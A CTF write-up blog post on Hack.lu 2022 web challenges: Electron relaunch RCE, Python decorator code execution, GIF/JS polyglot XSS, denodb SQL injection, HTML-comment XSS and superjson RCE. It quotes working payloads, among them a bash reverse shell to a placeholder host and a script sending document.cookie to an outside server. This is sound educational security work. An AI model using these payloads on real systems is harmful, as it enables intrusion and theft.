---
title: Hack.lu CTF 2022 Notes
date: 2022-10-31 20:05:37
tags: [Security]
categories: [Security]
photos: /img/hacklu-ctf-2022-writeup/cover-en.png
---

I was completely lost with the web problems and didn't solve anything. The quality of the problems was good and I learned a lot of new things, so it's worth recording.

Keywords:

1. Electron relaunch to RCE
2. Executing code using Python decorator
3. Preventing Apache from outputting content type header using special file names
4. GIF + JS polyglot
5. Bypassing SQLite's illegal column names
6. JS comment `<!--`
7. superjson

<!-- more -->

## babyelectron(21 solves)

Given an Electron app, the goal is to achieve RCE. A bot will visit your page using the app, and you need to find an XSS first, which I won't discuss here.

All the necessary security settings are enabled for this problem. The key is in the following code in the preload:

``` js
const RendererApi = {
  invoke: (action, ...args)  => {
      return ipcRenderer.send("RELaction",action, args);
  },
};

// SECURITY: expose a limted API to the renderer over the context bridge
// https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3
contextBridge.exposeInMainWorld("api", RendererApi);
```

In another JS file, there is this code:

``` js
// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and require them here.

app.RELbuy = function(listingId){
  return
}

app.RELsell = function(houseId, price, duration){
  return
}

app.RELinfo = function(houseId){
  return
}

app.RElist = function(listingId){
  return
}

app.RELsummary = function(userId){
 return 
}

ipcMain.on("RELaction", (_e, action, args)=>{
  //if(["RELbuy", "RELsell", "RELinfo"].includes(action)){
  if(/^REL/i.test(action)){
    app[action](...args)  
  }else{
    // ?? 
  }
})
```

It doesn't seem to be useful because those methods are not implemented.

But the point is that if you send the `relaunch` command, it will match, so you can execute [app.relaunch](https://www.electronjs.org/de/docs/latest/api/app#apprelaunchoptions), and specify the executable file location during relaunch to achieve RCE.

Payload provided by zeyu2001 in DC:

```js
{
  "houseId":"...",
  "token":"...",
  "message":"<img src=x onerror=\"window.api.invoke('relaunch',{execPath: 'bash', args: ['-c', 'bash -i >& /dev/tcp/HOST/PORT 0>&1']})\">",
  "price":""
 }
```

Sudistark's writeup: https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md

## Culinary Class Room(6 solves)

You are limited to adding a maximum of 250 decorators to one class, and they cannot have parameters. The goal is to execute any code and obtain the flag.

The author's solution is to find a list and push a lot of numbers into it, and then throw it into bytes and then into eval to execute. For example, the following code will push the number 112 into `copyright._Printer__filenames`.

```py
@copyright._Printer__filenames.append
@memoryview.__basicsize__.__sub__
@staticmethod.__basicsize__.__mul__
@object.__instancecheck__
class a:pass
```

The payload posted by Arusekk in DC:

```python
@print
@list
@eval
@bytes
@copyright._Printer__filenames.__add__
@list
@str.encode
@chr
@len
@StopAsyncIteration.__doc__.format
@copyright._Printer__filenames.append
@len
@OSError.__doc__.format
@copyright._Printer__filenames.append
@len
@len.__doc__.format
@copyright._Printer__filenames.extend
@str.encode
@int.real.__name__.strip
@len.__name__.format
@copyright._Printer__filenames.append
@len
@ValueError.__doc__.format
@copyright._Printer__filenames.append
@len
@Exception.__doc__.format
@copyright._Printer__filenames.append
@len
@OSError.__doc__.format
@copyright._Printer__filenames.append
@len
@StopIteration.__doc__.format
@copyright._Printer__filenames.extend
@str.encode
@open.__name__.format
@copyright._Printer__filenames.append
@len
@set.__doc__.format
@copyright._Printer__filenames.append
@len
@Exception.__doc__.format
@copyright._Printer__filenames.extend
@str.encode
@__import__.__name__.__add__
@str
@tuple
@str.split
@str.lower
@OSError.__name__.rstrip
@TypeError.__name__.format
class room: ...
```

The above code is doing:

```python
print(list(eval(b'__import__("os",).popen("./rea*")')))
```

Because I am extremely unfamiliar with Python, I need to learn it quickly.

`__doc__` can get the documentation of a method, which needs to be declared in the source code, like this:

``` python
def test():
  """hello"""
print(test.__doc__) # hello
```

Python has such a useful feature, which seems quite practical in development, and it should be easier to output it as a file.

In Python, `__builtins__` can be used to get all built-in things, which feels a bit like the global in js, and you can see what can be used.

Using `dir()` can list all attributes, so you can write a recursive function to find the list, like this:

``` python
visited = set()
def search(obj, path):
  for name in dir(obj):
    item = getattr(obj, name)
    new_path = path + "." + name
    if (type(item) == list):
      print(new_path)
      return
    if type(item) not in visited:
      visited.add(type(item))
      search(item, new_path)
      
search(__builtins__, "__builtins__")
```

Finally, you will find the list `__builtins__.copyright._Printer__filenames`.

The solution posted above finds the number and then uses `@copyright._Printer__filenames.append` to add it to the array. The return value is `None`, and then using the feature that `"abc".format(None)` is still "abc", you can turn the input into the desired string, and then use len to get the number.


## YummyGIFs(5 solves)

You can upload a gif (strictly checked to be a gif file) and add a title and description. The description will be filtered and rendered on the screen:

``` php
function s($input_str)
{
  $allowed_tags = ['<b>', '</b>', '<i>', '</i>', '<u>', '</u>', '<s>', '</s>', '<br>'];
  $current_str = $input_str;
  while (true) {
    $new_str = preg_replace_callback('/<.*?>/', function ($matches) use ($allowed_tags) {
      return in_array($matches[0], $allowed_tags) ? $matches[0] : '';
    }, $current_str);
    if ($new_str === $current_str) {
      return $new_str;
    }
    $current_str = $new_str;
  }
}
```

It looks strict, but it can actually be bypassed using unclosed tags, like this: `<script src="" p="`. Therefore, any tag can still be inserted.

The next problem is how to make `src` legal. Due to CSP self, we need to generate a GIF that is both a valid JS code. However, even if it is generated, because the content type is `image/gif`, the browser will still report an error, which will appear as:

> Refused to execute script from 'http://localhost:1234/a.gif' because its MIME type ('image/gif') is not executable.

The solution is to find a way not to output the content type.

Because this content type is given by Apache, it can be bypassed using the file name, for example, if the file name is `..gif`, the content type will not be given, as shown in: https://twitter.com/YNizry/status/1582733545759330306

This trick seems worth noting.

As for how to generate a GIF + JS polyglot, you can refer to: https://gist.github.com/ajinabraham/f2a057fb1930f94886a3

By the way, here is a note on PNG: [PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE!](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)

## foodAPI(4 solves)

The core code of this problem is as follows:

``` js
apiRouter.get("/food/:id", async(ctx) => {
    const id = helpers.getQuery(ctx, { mergeParams: true });
    try {
        const res = await Food.select({id: 'id', name: 'name'}).where(id).all()
        ctx.response.body = res;
    }
    catch (e) {
        console.log(e)
        ctx.response.body = e.name
    }
});
```

`id` will be an object, and you have complete control over it, but it does not support arrays and nested objects, and only simple objects can be passed in.

The goal is SQL injection.

This is the longest and most serious problem I have ever seen. I directly opened the Chrome debugger to trace the code. The following briefly explains the internal operation.

First, the object you passed in will be converted into the following form:

``` js
{
  wheres: [
    {field: "any", opeator: "=", value: "123"},
    {field: "name", opeator: "=", value: "hello"}
  ]
}
```

Then, it is passed to [this._translator.translateToQuery](https://github.com/eveningkid/denodb/blob/v1.0.40/lib/connectors/sqlite3-connector.ts#L55) to generate a well-formed SQL query. Then, using a mysterious string segmentation to see if there is a subquery, it is thrown into SQLite. Part of the code is as follows:

``` js
query(queryDescription: QueryDescription): Promise<any | any[]> {
  this._makeConnection();

  const query = this._translator.translateToQuery(queryDescription);
  const subqueries = query.split(/;(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/);

  const results = subqueries.map((subquery, index) => {
    const preparedQuery = this._client.prepareQuery(subquery + ";");
    // ...
  })
  // ...
}
```

The place where the string is segmented has caused problems before, and even if it is changed, problems will still occur, but it seems irrelevant in this problem: https://github.com/eveningkid/denodb/pull/241

The query generated here is already a complete SQL query, which means that the parameter binding is not done by throwing it into SQLite, but directly using JS.

So how is this complete SQL query generated?

First, your stuff will be thrown into the query builder, and something like this will be executed:

``` js
queryBuilder = queryBuilder.where(
  where.field,
  where.operator,
  where.value,
);

// 回傳 queryBuilder.toString
```

In the `queryBuilder.where`, it basically does things based on what you passed in. For example, if I pass: `{field:"id", operator:"=", value:"hello"}`, it will eventually execute:

```js
this._statements.push({
    grouping: 'where',
    type: 'whereBasic',
    column: "id",
    operator: "=",
    value: "name",
    not: this._not(),
    bool: this._bool(),
    asColumn: false,
  });
```

So the final conversion to a string is based on this `this._statements`.

First, it will generate a statement based on your where. How to generate it? Wrap the column in backticks and change the value to `?`, like this:

```sql
select * from `food` where `id`=? and `name`=?
```

The so-called "wrap" code is at: https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274

After generating the SQL query, data binding begins, and the code is roughly like this: https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6

``` js
function formatQuery(sql, bindings, timeZone, client) {
  bindings = bindings == null ? [] : [].concat(bindings);
  let index = 0;
  return sql.replace(/\\?\?/g, (match) => {
    if (match === '\\?') {
      return '?';
    }
    if (index === bindings.length) {
      return match;
    }
    const value = bindings[index++];
    return client._escapeBinding(value, { timeZone });
  });
}
```

Replace `?` with a string, then escape it first, which means adding single quotes outside, and then replacing the single quotes in the string with two single quotes.

It seems fine, but the `?` in the field name of deno's lib is forgotten to be escaped, so if you pass: `{"id":"1", "?": "A"}`, the resulting SQL will be:

```sql
select * from `food` where `id`=? and `?`=?
```

And after binding, it will become:

```sql
select * from `food` where `id`='1' and `'A'`=?
```

You will find that SQL injection can be done on the A side, just close the backtick first.

But the problem is that this will produce an illegal field name, because there must be a single quote inside, like this:

```sql
select * from `food` where `id`='1' and `'name`--'=?
```

It will result in:

> Error: no such column: 'name

I got stuck here at the beginning, there are probably two ways:

1. There are other vulnerabilities that have not been noticed.
2. There is a magical SQLite syntax that can bypass non-existent field names.

The answer is the latter.

Neither of the following two will go wrong:

```sql
select id from food where `not_exist'` and 0 union select 1;
select id from food where `not_exist'` in () union select 1;
```

Don't ask me why, I don't know either, it feels like some kind of syntax bug (or feature XD).

After getting the SQL injection, just make a time-based query, and then use xsleak to test the time. Or you can make it error-based like terjanq, which is more efficient.

Other people's writeups:

1. parrot https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98
2. terjanq https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436
3. kunte_ https://files.veryhax.ninja/solve-foodapi-hacklu22.html

## HTPL(3 solves)

This is a self-made AST that uses HTML to combine JS, for example:

``` html
<x-str>hello<x-str>
```

will be translated into `"hello"`.

The goal is to steal cookies, so you need to be able to execute XSS. I looked at this problem for a long time but didn't have any ideas. I thought that some mathematical operations could be used to escape strings, but I didn't find `\`, and I didn't see `*` that could be used for comments.

After the game, I found that the idea was close, but I forgot that the HTML comment `<!--` can also be used. Using less than + not + subtraction can combine to form the comment symbol, like this:

``` html
<x-program>
    <x-lt>
        <x-str>a</x-str>
        <x-not>
            <x-dec>
                <x-identifier>1</x-identifier>
            </x-dec>
        </x-not>
    </x-lt>
</x-program>
```

will be translated into:

``` js
"a"<!--$1$;
```

The final semicolon will be removed, so it can be combined with the `[]` in the next line to become an attribute access, like this:

```html
<x-program>
    <x-const>
        <x-identifier>a</x-identifier>
        <x-lt>
            <x-str>x</x-str>
            
            <x-not><x-dec>
                <x-identifier>asd</x-identifier>
            </x-dec></x-not>
        </x-lt>        
    </x-const>
    <x-array>
        <x-str>toString</x-str>
    </x-array>
</x-program>
```

will be translated into:

``` js
const write = (s) => alert(s);
const read = (s) => prompt(s);

const $a$="x"<!--$asd$;
["toString"];
```

which is `const $a$="x"["toString"]`

It's easy once you get here, just continue to get the function constructor and then call it, like this:

``` html
<x-program>

    <x-const>
        <x-identifier>a</x-identifier>
        <x-lt>
            <x-str>x</x-str>
            
            <x-not><x-dec>
                <x-identifier>asd</x-identifier>
            </x-dec></x-not>
        </x-lt>        
    </x-const>
    <x-array>
        <x-str>toString</x-str>
    </x-array>

    <x-const>
        <x-identifier>b</x-identifier>
        <x-lt>
            <x-identifier>a</x-identifier>
            
            <x-not><x-dec>
                <x-identifier>asd</x-identifier>
            </x-dec></x-not>
        </x-lt>        
    </x-const>
    <x-array>
        <x-str>constructor</x-str>
    </x-array>

    <x-const>
        <x-identifier>c</x-identifier>
        <x-call>
            <x-identifier>b</x-identifier>
            <x-str>alert("xss")</x-str>
        </x-call>      
    </x-const>

    <x-call>
        <x-identifier>c</x-identifier>
    </x-call>  
</x-program>
```

will become:

``` js
const write = (s) => alert(s);
const read = (s) => prompt(s);

const $a$="x"<!--$asd$;
["toString"];
const $b$=$a$<!--$asd$;
["constructor"];
const $c$=($b$)("alert(\"xss\")");
($c$)();
```

terjanq's [solution](https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436) is shorter, directly using iframe + name to get the feature of window in the iframe, and then get the eval in the iframe (it doesn't matter if you remove that if):

```html
<iframe name=$win$></iframe>
<x-program>
    <x-if>
        <x-num>1</x-num>
        <x-const>
            <x-identifier>test</x-identifier>
        
            <x-lt>
                <x-identifier>win</x-identifier>
                
                <x-not><x-dec>
                    <x-identifier>asd</x-identifier>
                </x-dec></x-not>
            </x-lt>        
        </x-const>
        <x-array>
                <x-str>eval</x-str>
        </x-array>
        <x-call>
            <x-identifier>test</x-identifier>
            <x-str>top.location='https://server/?c='+document.cookie</x-str>
        </x-call>
    </x-if>
</x-program>
```

The code will be:

``` js
const write = (s) => alert(s);
const read = (s) => prompt(s);
if(1){
const $test$=$win$<!--$asd$;
["eval"];
($test$)("alert(1337)");
};
```

## JaaSon(6 solves)

As a bonus, this is a misc JS problem. You can give a json string, which will be thrown into [superjson](https://github.com/blitz-js/superjson).

Although the version used has a prototype pollution vulnerability, it has already locked the prototype with `Object.freeze(Object.prototype)`, so there is no prototype pollution that can be used.

I haven't had time to study this problem yet, but it is related to the internal operation mechanism of superjson. You can use `referentialEqualities` to specify some values, for example:

``` js
{
  "json": {
    "brands": [
      { "name": "Sonar" }
    ],
    "products": [
      { "name": "SonarQube",  "brand": null }
    ]
  },
  "meta": {
    "referentialEqualities": {
      "brands.0": ["products.0.brand"]
    }
  }
}
```

It will execute `products[0].brand = brands[0];`, which seems to be intended to solve the reference problem when deep cloning.

For more details, please refer to: [Remote Code Execution via Prototype Pollution in Blitz.js](https://blog.sonarsource.com/blitzjs-prototype-pollution/), which explains it more comprehensively.

I haven't studied the other details, but it seems that some things in the object are replaced through this feature.

Below is the payload posted by szymex73 in DC:

```js
{
   "json":[
      [
         null,
         [
            {
               "value":"console.log(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"
            }
         ]
      ]
   ],
   "meta":{
      "values":{
         "2":[
            "map"
         ]
      },
      "referentialEqualities":{
         "constructor.prototype":[
            "1"
         ],
         "find.constructor":[
            "1.get"
         ],
         "push":[
            "1.set",
            "1.delete"
         ],
         "pop":[
            "1.next",
            "0.keys",
            "1.charAt"
         ],
         "2.constructor.prototype":[
            "1.__proto__",
            "0.0"
         ],
         "0.2":[
            "1.toString"
         ],
         "":[
            [
               [
                  1
               ]
            ]
         ]
      }
   }
}
```

Compared to the above, my teammate pew's payload seems to be easier to understand:

``` js
const superjson = require('superjson').default;

Object.freeze(Object.prototype);

javascript = `console.log(process.mainModule.require('child_process').execSync("/readflag").toString())`

var json = JSON.stringify(
    {
        json: {
            real_error: {
                "message": "",
            },
            real_map: [],
            fake_map: [""],
            real_str: "xxd",
            real_arr: [],
            x: javascript,
            js: javascript,
        },
        meta: {
          referentialEqualities: {
            'real_error.toString': ['fake_map.toString'],
            'constructor.constructor': ['fake_map.get'],
            'real_str.replace': ['fake_map.set'],
            'js': ['fake_map.name'],
            'real_arr.constructor.prototype.values': ['fake_map.keys'],
            'real_map.__proto__' : ['fake_map.__proto__'],
            'x': ['fake_map.0']
          },
          values: {
              real_map: [
                  "map"
              ],
              real_error: [
                  "Error"
              ]
          }
        },
    }
)
console.log(json)
console.log("")
```

## Postscript

The problems this time are all very interesting and novel. For example, the Python problem only uses decorators to execute arbitrary code, which is very cool, or the foodAPI directly tests a denoDB 0-day, which is also quite powerful.

The mysterious syntax of SQLite is also eye-opening. I look forward to someone posting a write-up in the future to explain which part of the code has that feature, and whether it is a feature or a bug.

The final point of HTPL is actually the JS comment `<!--`, but after being wrapped up, it is not so easy to find. This kind of "discovering familiar things after unpacking" is ideal for the problem.

For example, like the gif problem, if I didn't solve it, I would only think that my knowledge is insufficient and I don't know that `..gif` can be bypassed, or I would think that my ability to read code is insufficient and I can't see too deeply. But for the HTPL problem, if I didn't solve it but found that the knowledge point was something I knew, I would feel that the problem was packaged very cleverly.

Suddenly I feel that it is similar to some of the problems in the past competitions. Some problems cannot be solved because I really haven't learned that algorithm, but some problems are not too difficult after being broken down layer by layer, but they are packaged very well, so I will feel "Wow, this problem setter is so powerful."

By the way, terjanq is the GOAT in the CTF world for frontend, browser, and JS-related problems in my mind. I feel that as long as it is this type of problem, he can definitely solve it, which is really amazing.

Of course, other strong players are not weak. Every time I find that the difficult problems are almost solved by those few people. XD
